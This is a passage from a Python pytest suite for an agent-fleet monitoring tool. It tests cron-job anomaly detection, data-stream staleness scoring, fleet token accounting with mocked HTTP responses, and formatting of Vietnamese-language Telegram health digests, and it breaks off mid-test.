"""
Test Suite for Hermes Agent 24/7 Hourly Digest Monitor, Cronjob Clog & Anomaly Detector,
Entropy Stream Degradation Scanner, Composite Health Calculator, and Self-Healing Engine.
"""

import ast
import concurrent.futures
import errno
try:
    import fcntl
except ImportError:
    fcntl = None
import hashlib
import html
import io
import itertools
import json
import logging
import math
import os
import re
import secrets
import shlex
import sqlite3
import statistics
import subprocess
import sys
import time
import urllib.error
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import List, Tuple
from unittest.mock import MagicMock, patch

import pytest

from tools.hourly_digest_monitor import (
    CompositeHealthCalculator,
    CronAnomalyDetector,
    EntropyDegradationDetector,
    HermesTelegramNotifier,
    SelfHealingManager,
    SendResult,
    MAX_FLEET_BYTES,
    MAX_TELEMETRY_VALUE,
    _extract_clean_task_prompt,
    _safe_fetch_json,
    _safe_float,
    _safe_int,
    _safe_pct,
    _validate_fleet_url,
    run_full_scan,
)

TEST_CHAT_ID = "100000000"  # Synthetic test ID. Safety comes from test TELEGRAM_BOT_TOKEN and fail-closed send guard, never from this value alone.


# ==============================================================================
# Fixtures
# ==============================================================================
@pytest.fixture
def temp_dir(tmp_path):
    return tmp_path


@pytest.fixture
def mock_executions_db(tmp_path):
    db_file = tmp_path / "executions.db"
    conn = sqlite3.connect(str(db_file))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE executions (
            id TEXT PRIMARY KEY,
            job_id TEXT NOT NULL,
            source TEXT NOT NULL,
            process_id TEXT NOT NULL,
            pid INTEGER NOT NULL,
            process_started_at INTEGER,
            status TEXT NOT NULL,
            claimed_at TEXT NOT NULL,
            started_at TEXT,
            finished_at TEXT,
            error TEXT,
            cost REAL,
            tokens INTEGER
        )
        """
    )
    # Job 1: 3 consecutive failures (CLOGGED)
    for i in range(3):
        c.execute(
            """
            INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
            VALUES (?, 'job_clogged_1', 'builtin', 'proc_1', 100, 'failed', ?, 'RuntimeError: Execution failed')
            """,
            (f"e_clogged_{i}", f"2026-10-12T10:{i:02d}:00Z"),
        )

    # Job 2: 2 failures then 1 completed (NOT clogged)
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_old1', 'job_recovered', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T08:00:00Z', 'err')
        """
    )
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_old2', 'job_recovered', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T08:30:00Z', 'err')
        """
    )
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_ok_latest', 'job_recovered', 'builtin', 'proc_1', 100, 'completed', '2026-10-12T09:00:00Z', NULL)
        """
    )

    # Job 3: 1 single failure (NOT clogged)
    c.execute(
        """
        INSERT INTO executions (id, job_id, source, process_id, pid, status, claimed_at, error)
        VALUES ('e_single_fail', 'job_single', 'builtin', 'proc_1', 100, 'failed', '2026-10-12T10:00:00Z', 'single err')
        """
    )

    conn.commit()
    conn.close()
    return db_file


@pytest.fixture
def mock_jobs_json(tmp_path):
    jobs_file = tmp_path / "jobs.json"
    now_utc = datetime.now(timezone.utc)
    overdue_time = (now_utc - timedelta(seconds=1200)).isoformat()
    future_time = (now_utc + timedelta(seconds=3600)).isoformat()

    data = {
        "updated_at": now_utc.isoformat(),
        "jobs": [
            {
                "id": "job_clogged_1",
                "name": "clogged-service",
                "enabled": True,
                "model": None,
                "provider": None,
                "model_snapshot": "cx/gpt-5.6-luna",
                "provider_snapshot": "custom",
                "drift_alerted": True,
                "next_run_at": future_time,
                "last_error": "RuntimeError: [drift_skip:silent] Skipped to prevent unintended spend",
            },
            {
                "id": "job_overdue_1",
                "name": "overdue-crawler",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "next_run_at": overdue_time,
                "last_error": None,
            },
            {
                "id": "job_auth_fail",
                "name": "gmail-sync",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": "Token refresh failed: ('invalid_grant: Bad Request', {'error': 'invalid_grant'})",
            },
            {
                "id": "job_rate_limited",
                "name": "c3ai-mirror",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": "HTTP 503: [codex] [429]: The usage limit has been reached",
            },
            {
                "id": "job_healthy",
                "name": "healthy-heartbeat",
                "enabled": True,
                "model": "codex",
                "provider": "custom",
                "model_snapshot": "codex",
                "provider_snapshot": "custom",
                "drift_alerted": False,
                "next_run_at": future_time,
                "last_error": None,
            },
        ],
    }
    with open(jobs_file, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
    return jobs_file


@pytest.fixture
def mock_ticker_heartbeat(tmp_path):
    hb_file = tmp_path / "ticker_heartbeat"
    now_ts = time.time() - 30.0  # 30s ago -> fresh
    hb_file.write_text(str(now_ts), encoding="utf-8")
    return hb_file


# ==============================================================================
# 1. Tests: CronAnomalyDetector
# ==============================================================================
def test_cron_anomaly_detector_clogged_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    clogged = detector.check_clogged_jobs(min_failures=3)
    assert len(clogged) == 1
    assert clogged[0]["job_id"] == "job_clogged_1"
    assert clogged[0]["job_name"] == "clogged-service"
    assert clogged[0]["consecutive_failures"] == 3


def test_cron_anomaly_detector_drift_skipped_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    drifted = detector.check_drift_skipped_jobs()
    assert len(drifted) == 1
    assert drifted[0]["job_id"] == "job_clogged_1"
    assert drifted[0]["drift_alerted"] is True
    assert "[drift_skip" in drifted[0]["last_error"]


def test_cron_anomaly_detector_overdue_jobs(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
        grace_period_seconds=300,
    )
    now_utc = datetime.now(timezone.utc)
    overdue = detector.check_overdue_jobs(now_utc=now_utc)
    assert len(overdue) == 1
    assert overdue[0]["job_id"] == "job_overdue_1"
    assert overdue[0]["overdue_seconds"] > 300


def test_cron_anomaly_detector_auth_and_rate_limited(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    auth_failed = detector.check_auth_failed_jobs()
    assert len(auth_failed) == 1
    assert auth_failed[0]["job_id"] == "job_auth_fail"

    rate_limited = detector.check_rate_limited_jobs()
    assert len(rate_limited) == 1
    assert rate_limited[0]["job_id"] == "job_rate_limited"


def test_cron_anomaly_detector_ticker_fresh_and_stale(tmp_path, mock_executions_db, mock_jobs_json):
    # Test fresh ticker
    hb_fresh = tmp_path / "ticker_fresh"
    now_utc = datetime.now(timezone.utc)
    hb_fresh.write_text(str(now_utc.timestamp() - 40.0), encoding="utf-8")

    det_fresh = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=hb_fresh,
    )
    res_fresh = det_fresh.check_ticker_stale(max_age_seconds=120.0, now_utc=now_utc)
    assert res_fresh["exists"] is True
    assert res_fresh["is_stale"] is False
    assert res_fresh["age_seconds"] < 120.0

    # Test stale ticker (>120s)
    hb_stale = tmp_path / "ticker_stale"
    hb_stale.write_text(str(now_utc.timestamp() - 250.0), encoding="utf-8")
    det_stale = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=hb_stale,
    )
    res_stale = det_stale.check_ticker_stale(max_age_seconds=120.0, now_utc=now_utc)
    assert res_stale["is_stale"] is True
    assert res_stale["age_seconds"] >= 250.0


def test_cron_health_score(mock_executions_db, mock_jobs_json, mock_ticker_heartbeat):
    detector = CronAnomalyDetector(
        db_path=mock_executions_db,
        jobs_path=mock_jobs_json,
        heartbeat_path=mock_ticker_heartbeat,
    )
    findings = detector.scan()
    # Has clogged, drift, overdue, auth, and rate-limited
    score = findings["cron_health_score"]
    assert 0 <= score < 60


# ==============================================================================
# 2. Tests: EntropyDegradationDetector (All 5 Streams)
# ==============================================================================
def test_entropy_stream_1_stock_news(tmp_path):
    db_file = tmp_path / "stock_news.sqlite"
    conn = sqlite3.connect(str(db_file))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE raw_articles (
            url_hash TEXT PRIMARY KEY,
            symbol TEXT,
            published_at TEXT,
            crawled_at TEXT
        )
        """
    )
    c.execute("CREATE TABLE corporate_events (event_id TEXT PRIMARY KEY)")

    now_utc = datetime.now(timezone.utc)

    # 1. Fresh state: crawled 1 hour ago
    c.execute(
        "INSERT INTO raw_articles VALUES ('h1', 'FPT', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=1)).isoformat(),),
    )
    c.execute(
        "INSERT INTO raw_articles VALUES ('h2', 'HPG', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=0.5)).isoformat(),),
    )
    conn.commit()

    detector = EntropyDegradationDetector(stock_db_path=db_file)
    res = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res["status"] == "HEALTHY"
    assert res["score"] == 100
    assert res["unique_symbols"] == 2
    assert res["articles_24h"] == 2

    # 2. Degraded state: crawled 4 hours ago
    c.execute("DELETE FROM raw_articles")
    c.execute(
        "INSERT INTO raw_articles VALUES ('h3', 'CII', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=4)).isoformat(),),
    )
    conn.commit()
    res_deg = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50

    # 3. Critical state: crawled 8 hours ago
    c.execute("DELETE FROM raw_articles")
    c.execute(
        "INSERT INTO raw_articles VALUES ('h4', 'CII', '2026-10-12', ?)",
        ((now_utc - timedelta(hours=8)).isoformat(),),
    )
    conn.commit()
    res_crit = detector.check_stream_1_stock_news(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0

    conn.close()


def test_entropy_stream_2_legal_docs(tmp_path):
    legal_dir = tmp_path / "legal_docs"
    legal_dir.mkdir()
    history_db = legal_dir / "history.sqlite"
    conn = sqlite3.connect(str(history_db))
    c = conn.cursor()
    c.execute(
        """
        CREATE TABLE legal_documents (
            doc_id TEXT PRIMARY KEY,
            so_hieu TEXT,
            crawled_at TEXT
        )
        """
    )
    now_utc = datetime.now(timezone.utc)

    # 1. Fresh state: crawled 10 hours ago
    c.execute(
        "INSERT INTO legal_documents VALUES ('d1', '123/ND-CP', ?)",
        ((now_utc - timedelta(hours=10)).isoformat(),),
    )
    conn.commit()

    detector = EntropyDegradationDetector(legal_dir_path=legal_dir)
    res_fresh = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["total_documents"] == 1

    # 2. Degraded state: crawled 40 hours ago
    c.execute("DELETE FROM legal_documents")
    c.execute(
        "INSERT INTO legal_documents VALUES ('d2', '456/ND-CP', ?)",
        ((now_utc - timedelta(hours=40)).isoformat(),),
    )
    conn.commit()
    res_deg = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50

    # 3. Critical state: crawled 90 hours ago
    c.execute("DELETE FROM legal_documents")
    c.execute(
        "INSERT INTO legal_documents VALUES ('d3', '789/ND-CP', ?)",
        ((now_utc - timedelta(hours=90)).isoformat(),),
    )
    conn.commit()
    res_crit = detector.check_stream_2_legal_docs(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0

    conn.close()


def test_entropy_stream_3_media_production(tmp_path):
    media_file = tmp_path / "daily_media.json"
    now = datetime(2026, 10, 12, 14, 0, 0)  # hour 14

    # 1. Fresh state: hour 14, completed 14 videos
    data_fresh = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 14,
        "completed_photos": 14,
    }
    media_file.write_text(json.dumps(data_fresh), encoding="utf-8")
    detector = EntropyDegradationDetector(media_json_path=media_file)
    res_fresh = detector.check_stream_3_media_production(now=now)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["current_hour_lag"] == 0

    # 2. Degraded state: completed 11 videos (lag 3)
    data_deg = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 11,
        "completed_photos": 11,
    }
    media_file.write_text(json.dumps(data_deg), encoding="utf-8")
    res_deg = detector.check_stream_3_media_production(now=now)
    assert res_deg["status"] == "DEGRADED"
    assert res_deg["score"] == 50
    assert res_deg["current_hour_lag"] == 3

    # 3. Critical state: 0 completed videos
    data_crit = {
        "date": "2026-10-12",
        "target_videos": 24,
        "target_photos": 24,
        "completed_videos": 0,
        "completed_photos": 0,
    }
    media_file.write_text(json.dumps(data_crit), encoding="utf-8")
    res_crit = detector.check_stream_3_media_production(now=now)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0


def test_entropy_stream_4_median_sync(tmp_path):
    log_file = tmp_path / "median_hourly_sync.log"
    now_utc = datetime.now(timezone.utc)

    # 1. Healthy state
    log_file.write_text(
        "Checks:                58 / 58, 100%, Listed 116\n"
        "✅ [MedianSync] ✅ Hourly Sync Cycle Complete.\n"
        "✅ [Hermes Cron] Hourly Sync completed successfully.\n",
        encoding="utf-8",
    )
    detector = EntropyDegradationDetector(median_log_path=log_file)
    res_fresh = detector.check_stream_4_median_sync(now_utc=now_utc)
    assert res_fresh["status"] == "HEALTHY"
    assert res_fresh["score"] == 100
    assert res_fresh["checks_count"] == 58
    assert res_fresh["exit_code"] == 0

    # 2. Critical state: exit code failure
    log_file.write_text(
        "❌ [Hermes Cron] Hourly Sync failed with exit code 2.\n",
        encoding="utf-8",
    )
    res_crit = detector.check_stream_4_median_sync(now_utc=now_utc)
    assert res_crit["status"] == "CRITICAL"
    assert res_crit["score"] == 0
    assert res_crit["exit_code"] == 2


def test_entropy_stream_5_fleet_mesh(tmp_path):
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
    )

    # Healthy state mock
    summary_resp = json.dumps({"online_nodes": 19, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 99.0, "sla_passed": True}).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        else:
            mock_obj.read.return_value = council_resp
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh()
        assert res["status"] == "HEALTHY"
        assert res["score"] == 99
        assert res["active_nodes"] == 19
        assert res["sla_passed"] is True

    # Critical fallback when offline
    with patch("urllib.request.urlopen", side_effect=Exception("Connection refused")):
        res_down = detector.check_stream_5_fleet_mesh()
        assert res_down["status"] == "CRITICAL"
        assert res_down["score"] == 0


def test_fleet_tokenomics_and_activity_collection(tmp_path):
    detector = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    summary_resp = json.dumps({"online_nodes": 20, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 95.0, "sla_passed": True}).encode("utf-8")

    # Nodes mock: 6 nodes, total_fleet_tokens = 68838970, nebula has highest requests_served
    nodes_data = {
        "nodes": [
            {
                "name": "nebula",
                "tier": "ultra",
                "requests_served": 500,
                "quota_weekly_consumed": 30000000,
                "active_jobs": 1,
            },
            {
                "name": "lthn.Ariana",
                "tier": "ultra",
                "requests_served": 400,
                "quota_weekly_consumed": 20000000,
                "active_jobs": 0,
            },
            {
                "name": "pro-1",
                "tier": "pro",
                "requests_served": 300,
                "quota_weekly_consumed": 10000000,
                "active_jobs": 0,
            },
            {
                "name": "pro-2",
                "tier": "pro",
                "requests_served": 200,
                "quota_weekly_consumed": 5000000,
                "active_jobs": 0,
            },
            {
                "name": "pro-3",
                "tier": "pro",
                "requests_served": 100,
                "quota_weekly_consumed": 3838970,
                "active_jobs": 0,
            },
            {
                "name": "pro-4",
                "tier": "pro",
                "requests_served": 50,
                "quota_weekly_consumed": 0,
                "active_jobs": 0,
            },
        ]
    }
    nodes_resp = json.dumps(nodes_data).encode("utf-8")

    # Jobs mock: 4 jobs, total_jobs_tokens = 347802
    jobs_data = {
        "jobs": [
            {
                "job_id": "c6e5ff82-abcd-1111",
                "node_name": "nebula",
                "model": "claude-opus-4.8",
                "total_tokens": 200000,
                "prompt": "Refactor architecture and audit tokenomics across all nodes in the fleet",
            },
            {
                "job_id": "a1b2c3d4-ef56-2222",
                "node_name": "lthn.Ariana",
                "model": "gemini-3.1-pro-high",
                "total_tokens": 100000,
                "prompt": "Perform deep math proof on median-0 animation pipeline",
            },
            {
                "job_id": "f9e8d7c6-ba54-3333",
                "node_name": "pro-1",
                "model": "gemini-3.8-flash-high",
                "total_tokens": 47802,
                "prompt": "Generate unit tests for entropy degradation detector",
            },
            {
                "job_id": "12345678-0000-4444",
                "node_name": "pro-2",
                "model": "gemini-3.8-flash-high",
                "total_tokens": 0,
                "prompt": "Ping check",
            },
        ]
    }
    jobs_resp = json.dumps(jobs_data).encode("utf-8")

    def mock_urlopen(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = nodes_resp
        elif "mock-jobs" in url:
            mock_obj.read.return_value = jobs_resp
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen):
        res = detector.check_stream_5_fleet_mesh()
        assert res["total_jobs_tokens"] == 347802
        assert res["total_fleet_tokens"] == 68838970
        assert len(res["top_3_tasks"]) == 3
        assert len(res["top_5_nodes"]) == 5
        assert res["top_5_nodes"][0]["name"] == "nebula"
        assert "pro_first_criterion" in res
        pfc = res["pro_first_criterion"]
        assert pfc["status"] in ("PASS", "WARNING", "CRITICAL")
        assert "pro_burn_pct" in pfc
        assert "pro_request_share_pct" in pfc
        assert pfc["total_pro_nodes"] == 4
        assert "starved_count" in pfc


def test_pro_first_quota_exhaustion_quality_criterion(tmp_path):
    """Test explicit Pro-First Quota Exhaustion & Workload Quality Criterion evaluation and digest formatting."""
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    # 1. Optimal Scenario: Pro nodes heavily utilized (recent_pro_share_pct >= 80%)
    detector_optimal = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    summary_resp = json.dumps({"online_nodes": 20, "total_nodes": 21}).encode("utf-8")
    council_resp = json.dumps({"composite_consensus_score": 95.0, "sla_passed": True}).encode("utf-8")

    optimal_nodes = {
        "nodes": [
            {"name": "pro-1", "tier": "pro", "requests_served": 150, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 2200000, "quota_weekly_percent": 12.0, "active_jobs": 0},
            {"name": "pro-2", "tier": "pro", "requests_served": 140, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 2100000, "quota_weekly_percent": 16.0, "active_jobs": 0},
            {"name": "pro-3", "tier": "pro", "requests_served": 130, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 2000000, "quota_weekly_percent": 20.0, "active_jobs": 0},
            {"name": "nebula", "tier": "ultra", "requests_served": 20, "quota_weekly_capacity": 10000000, "quota_weekly_consumed": 500000, "quota_weekly_percent": 95.0, "active_jobs": 0},
        ]
    }
    optimal_jobs = {
        "jobs": [
            {"job_id": "job-1", "node_name": "pro-1", "model": "gemini-3.8-flash-high", "total_tokens": 10000, "prompt": "Task 1"},
            {"job_id": "job-2", "node_name": "pro-2", "model": "gemini-3.8-flash-high", "total_tokens": 12000, "prompt": "Task 2"},
            {"job_id": "job-3", "node_name": "pro-3", "model": "gemini-3.8-flash-high", "total_tokens": 8000, "prompt": "Task 3"},
            {"job_id": "job-4", "node_name": "pro-1", "model": "gemini-3.8-flash-high", "total_tokens": 9000, "prompt": "Task 4"},
            {"job_id": "job-5", "node_name": "nebula", "model": "claude-opus-4.8", "total_tokens": 15000, "prompt": "Task 5"},
        ]
    }

    def mock_urlopen_optimal(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = json.dumps(optimal_nodes).encode("utf-8")
        elif "mock-jobs" in url:
            mock_obj.read.return_value = json.dumps(optimal_jobs).encode("utf-8")
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen_optimal):
        res_optimal = detector_optimal.check_stream_5_fleet_mesh()
        criterion = res_optimal["pro_first_criterion"]
        assert criterion["grade"] == "OPTIMAL"
        assert criterion["status"] == "PASS"
        assert criterion["badge"] == "🟢 ĐẠT CHUẨN"
        assert criterion["recent_pro_share_pct"] == 80.0
        assert criterion["starved_count"] == 0
        assert "Round-Robin" in criterion["verdict"]

        # Test formatting in hourly digest
        scan_result = {
            "overall_health_score": 98,
            "severity": "HEALTHY",
            "cron": {"cron_health_score": 100, "clogged_jobs": [], "drift_skipped_jobs": [], "ticker_heartbeat": {"is_stale": False, "age_seconds": 12.0}},
            "entropy": {"entropy_health_score": 95, "streams": [res_optimal]},
        }
        digest_html = notifier.format_hourly_digest(scan_result)
        assert "🎯 <b>Tiêu Chí Quality Hàng Giờ: Dùng Quota Pro Agy First:</b>" in digest_html
        assert "• <b>Tỷ lệ Đốt Quota Pro Fleet:</b>" in digest_html
        assert "• <b>Tỷ trọng Tải Pro Nodes:</b>" in digest_html
        assert "• <b>Nodes Pro còn dồi dào (&gt;75% tồn):</b>" in digest_html
        assert "• <b>Kết luận Vận hành:</b>" in digest_html
        assert "🟢 ĐẠT CHUẨN" in digest_html
        assert "OPTIMAL" in digest_html
        assert "Toàn bộ tải đang được ưu tiên đốt cạn Quota Pro qua Round-Robin." in digest_html

    # 2. Deficit Scenario: Pro nodes starved and underutilized (recent_pro_share_pct < 40%)
    detector_deficit = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )

    deficit_nodes = {
        "nodes": [
            {"name": "pro-1", "tier": "pro", "requests_served": 1, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 50000, "quota_weekly_percent": 98.0, "active_jobs": 0},
            {"name": "pro-2", "tier": "pro", "requests_served": 2, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 70000, "quota_weekly_percent": 97.2, "active_jobs": 0},
            {"name": "pro-3", "tier": "pro", "requests_served": 0, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 0, "quota_weekly_percent": 100.0, "active_jobs": 0},
            {"name": "nebula", "tier": "ultra", "requests_served": 500, "quota_weekly_capacity": 10000000, "quota_weekly_consumed": 8000000, "quota_weekly_percent": 20.0, "active_jobs": 2},
            {"name": "lthn.Ariana", "tier": "ultra", "requests_served": 400, "quota_weekly_capacity": 10000000, "quota_weekly_consumed": 7000000, "quota_weekly_percent": 30.0, "active_jobs": 1},
        ]
    }
    deficit_jobs = {
        "jobs": [
            {"job_id": "job-d1", "node_name": "nebula", "model": "claude-opus-4.8", "total_tokens": 50000, "prompt": "Audit 1"},
            {"job_id": "job-d2", "node_name": "lthn.Ariana", "model": "gemini-3.1-pro-high", "total_tokens": 40000, "prompt": "Audit 2"},
            {"job_id": "job-d3", "node_name": "nebula", "model": "claude-opus-4.8", "total_tokens": 30000, "prompt": "Audit 3"},
        ]
    }

    def mock_urlopen_deficit(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = json.dumps(deficit_nodes).encode("utf-8")
        elif "mock-jobs" in url:
            mock_obj.read.return_value = json.dumps(deficit_jobs).encode("utf-8")
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen_deficit):
        res_deficit = detector_deficit.check_stream_5_fleet_mesh()
        criterion_d = res_deficit["pro_first_criterion"]
        assert criterion_d["grade"] == "DEFICIT"
        assert criterion_d["status"] == "CRITICAL"
        assert criterion_d["badge"] == "🔴 LỆCH TIÊU CHÍ"
        assert criterion_d["starved_count"] == 3
        assert set(criterion_d["starved_pro_nodes"]) == {"pro-1", "pro-2", "pro-3"}

        scan_result_d = {
            "overall_health_score": 65,
            "severity": "WARNING",
            "cron": {"cron_health_score": 100, "clogged_jobs": [], "drift_skipped_jobs": [], "ticker_heartbeat": {"is_stale": False, "age_seconds": 15.0}},
            "entropy": {"entropy_health_score": 60, "streams": [res_deficit]},
        }
        digest_html_d = notifier.format_hourly_digest(scan_result_d)
        assert "🔴 LỆCH TIÊU CHÍ" in digest_html_d
        assert "DEFICIT" in digest_html_d
        assert "Tỷ trọng tải Pro quá thấp so với Nebula/Ultra; vi phạm nguyên tắc Pro-First." in digest_html_d

    # 3. Acceptable Scenario: Pro nodes with intermediate share (recent_pro_share_pct == 50%)
    detector_acceptable = EntropyDegradationDetector(
        fleet_summary_url="http://mock-summary",
        fleet_council_url="http://mock-council",
        fleet_nodes_url="http://mock-nodes",
        fleet_jobs_url="http://mock-jobs",
    )
    acceptable_nodes = {
        "nodes": [
            {"name": "pro-1", "tier": "pro", "requests_served": 50, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 1000000, "quota_weekly_percent": 60.0, "active_jobs": 0},
            {"name": "pro-2", "tier": "pro", "requests_served": 2, "quota_weekly_capacity": 2500000, "quota_weekly_consumed": 50000, "quota_weekly_percent": 98.0, "active_jobs": 0},
            {"name": "nebula", "tier": "ultra", "requests_served": 50, "quota_weekly_capacity": 10000000, "quota_weekly_consumed": 2000000, "quota_weekly_percent": 80.0, "active_jobs": 0},
        ]
    }
    acceptable_jobs = {
        "jobs": [
            {"job_id": "job-a1", "node_name": "pro-1", "model": "gemini-3.8-flash-high", "total_tokens": 10000, "prompt": "Task 1"},
            {"job_id": "job-a2", "node_name": "nebula", "model": "claude-opus-4.8", "total_tokens": 10000, "prompt": "Task 2"},
        ]
    }

    def mock_urlopen_acceptable(req, *args, **kwargs):
        mock_obj = MagicMock()
        url = req.full_url if hasattr(req, "full_url") else str(req)
        if "mock-summary" in url:
            mock_obj.read.return_value = summary_resp
        elif "mock-council" in url:
            mock_obj.read.return_value = council_resp
        elif "mock-nodes" in url:
            mock_obj.read.return_value = json.dumps(acceptable_nodes).encode("utf-8")
        elif "mock-jobs" in url:
            mock_obj.read.return_value = json.dumps(acceptable_jobs).encode("utf-8")
        else:
            mock_obj.read.return_value = b"{}"
        mock_obj.__enter__.return_value = mock_obj
        return mock_obj

    with patch("urllib.request.urlopen", side_effect=mock_urlopen_acceptable):
        res_acceptable = detector_acceptable.check_stream_5_fleet_mesh()
        criterion_a = res_acceptable["pro_first_criterion"]
        assert criterion_a["grade"] == "ACCEPTABLE"
        assert criterion_a["status"] == "WARNING"
        assert criterion_a["badge"] == "🟡 CẦN TỐI ƯU"
        assert criterion_a["recent_pro_share_pct"] == 50.0

    # 4. _safe_float edge case tests
    assert _safe_float(None) == 0.0
    assert _safe_float("12.34") == 12.34
    assert _safe_float(float("nan"), default=5.0) == 5.0
    assert _safe_float(float("inf"), default=5.0) == 5.0
    assert _safe_float("-5.0", min_val=0.0) == 0.0
    assert _safe_float("invalid", default=10.0) == 10.0
    assert _safe_float(b" 42.5 ") == 42.5


def test_format_hourly_digest_focuses_on_tokens_tasks_and_nodes(tmp_path):
    env_file = tmp_path / ".env"
    env_file.write_text("TELEGRAM_BOT_TOKEN=test-token-123\n")
    notifier = HermesTelegramNotifier(env_file=env_file, target_chat_id=TEST_CHAT_ID)

    scan_result = {
        "overall_health_score": 95,
        "severity": "HEALTHY",
        "cron": {
            "cron_health_score": 100,
            "clogged_jobs": [],
            "drift_skipped_jobs": [],
            "auth_failed_jobs": [],
            "rate_limited_jobs": [],
            "overdue_jobs": [],
            "ticker_heartbeat": {"is_stale": False, "age_seconds": 10.0},
        },
        "entropy": {
            "entropy_health_score": 90,
            "streams": [
                {
